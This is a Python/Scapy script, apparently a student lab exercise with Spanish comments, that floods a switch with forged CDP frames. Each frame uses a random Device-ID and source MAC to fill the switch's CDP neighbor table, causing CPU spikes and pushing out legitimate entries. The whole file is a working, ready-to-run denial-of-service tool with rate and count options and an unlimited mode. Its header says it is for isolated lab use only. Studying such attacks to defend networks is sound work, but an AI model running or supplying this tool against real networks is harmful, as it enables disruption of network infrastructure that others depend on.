#!/usr/bin/env python3
"""
cdp_dos.py — CDP Neighbor Table Exhaustion (DoS)
=================================================
Genera frames CDP con Device-IDs y MACs de origen aleatorios
para saturar la tabla de vecinos CDP del switch objetivo.

Mecanismo:
  - CDP usa multicast 01:00:0c:cc:cc:cc sobre Dot3 (IEEE 802.3)
  - Encapsulación: Dot3 → LLC SNAP (OUI=0x00000c / code=0x2000)
  - Cada Device-ID único genera una nueva entrada en la tabla CDP
  - Tabla llena → CPU spike / entradas legítimas desplazadas

Autor     : Julio Pujols — Matrícula: 20250692
Red       : 192.168.92.0/24
Requisitos: Python 3.6+ | Scapy >= 2.4.0 | root/sudo
[LAB]     : Uso exclusivo en entorno de laboratorio aislado.
"""

import argparse
import random
import signal
import string
import sys
import time

from scapy.all import conf, sendp
from scapy.contrib.cdp import (
    CDPMsgCapabilities,
    CDPMsgDeviceID,
    CDPMsgPlatform,
    CDPMsgPortID,
    CDPMsgSoftwareVersion,
    CDPv2_HDR,
)
from scapy.layers.l2 import LLC, SNAP, Dot3

CDP_MULTICAST = "01:00:0c:cc:cc:cc"
_stats = {"sent": 0, "t0": 0.0}


def _sigint(sig, frame):
    elapsed = time.time() - _stats["t0"]
    rate = _stats["sent"] / elapsed if elapsed > 0 else 0
    print(f"\n[!] Detenido — {_stats['sent']:,} paquetes | {rate:.0f} pkt/s")
    sys.exit(0)


def _rand_str(n: int = 14) -> str:
    return "".join(random.choices(string.ascii_uppercase + string.digits, k=n))


def _rand_mac() -> str:
    return ":".join(f"{random.randint(0, 255):02x}" for _ in range(6))


def _build_frame(src_mac: str, device_id: str):
    """
    Frame CDP válido sobre 802.3.
    Dot3 es obligatorio — CDP no usa EtherType DIX.
    El checksum de CDPv2_HDR es calculado automáticamente por Scapy.
    """
    return (
        Dot3(src=src_mac, dst=CDP_MULTICAST)
        / LLC(dsap=0xAA, ssap=0xAA, ctrl=0x03)
        / SNAP(OUI=0x00000C, code=0x2000)
        / CDPv2_HDR(vers=2, ttl=180)
        / CDPMsgDeviceID(val=device_id)
        / CDPMsgPortID(iface="GigabitEthernet0/1")
        / CDPMsgCapabilities()
        / CDPMsgSoftwareVersion(val="Cisco IOS 15.2(4)M")
        / CDPMsgPlatform(val="cisco WS-C3750-48P")
    )


def main():
    parser = argparse.ArgumentParser(
        description="CDP DoS — saturación de tabla de vecinos CDP"
    )
    parser.add_argument("-i", "--iface", required=True,
                        help="Interfaz de red (ej: eth0)")
    parser.add_argument("-r", "--rate", type=float, default=0.0,
                        help="pkt/s (0 = máximo posible)")
    parser.add_argument("-c", "--count", type=int, default=0,
                        help="Número de paquetes (0 = infinito)")
    args = parser.parse_args()

    conf.verb = 0
    signal.signal(signal.SIGINT, _sigint)
    interval = 1.0 / args.rate if args.rate > 0 else 0

    print(f"[*] CDP DoS | iface={args.iface} "
          f"rate={'MAX' if not args.rate else args.rate}")
    print("[*] Ctrl+C para detener\n")

    _stats["t0"] = time.time()
    while True:
        frame = _build_frame(_rand_mac(), _rand_str())
        sendp(frame, iface=args.iface, verbose=False)
        _stats["sent"] += 1

        if _stats["sent"] % 100 == 0:
            t = time.time() - _stats["t0"]
            print(f"\r[+] {_stats['sent']:,} paquetes | {_stats['sent']/t:.0f} pkt/s",
                  end="", flush=True)

        if args.count and _stats["sent"] >= args.count:
            _sigint(None, None)

        if interval:
            time.sleep(interval)


if __name__ == "__main__":
    main()
